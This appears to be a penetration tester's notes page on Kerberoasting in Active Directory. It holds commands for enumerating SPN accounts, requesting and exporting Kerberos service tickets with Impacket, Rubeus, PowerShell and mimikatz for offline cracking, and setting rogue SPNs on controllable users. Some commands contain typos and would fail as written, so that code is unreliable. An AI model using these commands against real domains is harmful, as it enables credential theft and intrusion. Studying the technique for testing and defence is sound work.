- ST can be requested by any user for any service if it's [SPN](Active%20Directory/AD%20Concepts/Services#SPN) is registered in the domain.
- STs are encrypted with the service account which runs the service.
- Hence, we can try to crack the password of the service user account.
- In case of managed service accounts, the password is of 120 characters and changes every month, hence it is not possible to crack their password.
- However, some services are run with normal user accounts, managed by people, that can have weak password.
- Kerberoast involves service running under regular user accounts. We can request STs for the services and crack password locally.
We can query for users with SPNs using
- Powerview
```powershell
Get-NetUser -SPN
```
- LDAP
```ladp
(&(samAccountType=805306368)(servicePrincipalName=*))
```
- AD-RSAT (Active Directory module)
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrinicipalName
```
- Rubeus
```powershell
# list kerberos stats
.\Rubeus.exe kerberoast /stats

# Look of kerberoastable account that only supports RC4_HMAC
.\Rubues.exe kerberoast /stat /rc4opsec
```
### Requesting STs
- Impacket's `GetUserSPNs.py` script can be used to query users with SPN and request STs for the service.
```bash
# This will search for SPNs, request STs for the same using supplied credentials and same the STs in "kerberoast.hash"
python GetUserSPNs.py mydomain.local/a.drdragon:Password!! -dc-ip <ip> -outputfile kerberoast.hash
```
- Requesting a TGS using powrshell
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQL/mssqldomain.mydomain.local"
# This will add the kerberos key in memeory, and can be verified with klist
klist
# The key can be extracted with mimikatz
kerberos::list /export
```
- Powerview
```powershell
Request-SPNTicket
```
- Rubeus
```powershell
.\Rubeus kerberoast /nowrap [/user:<username>] /simple

# for rc4_hmac account
.\Rubeus kerberoast /nowrap [/user:<username>] /simple /rc4opsec
```

If we have `GenericAll` or `GenericWrite` over a user, we can set a random SPN for that user, and request ST for it. This is opsec friendly as resetting a user password is noisy. SPN for a user can be set using (SPN should be unique for the forest): 
```powershell
# Powerview
Set-DomainOjbect -Identity support30user -Set @{serviceprincipalname = 'dcorp/whatever'}

# Ad module
Set-ADUser -Identity support30user -ServicePrincipalNames @{Add='dcorp/whatever'}
```
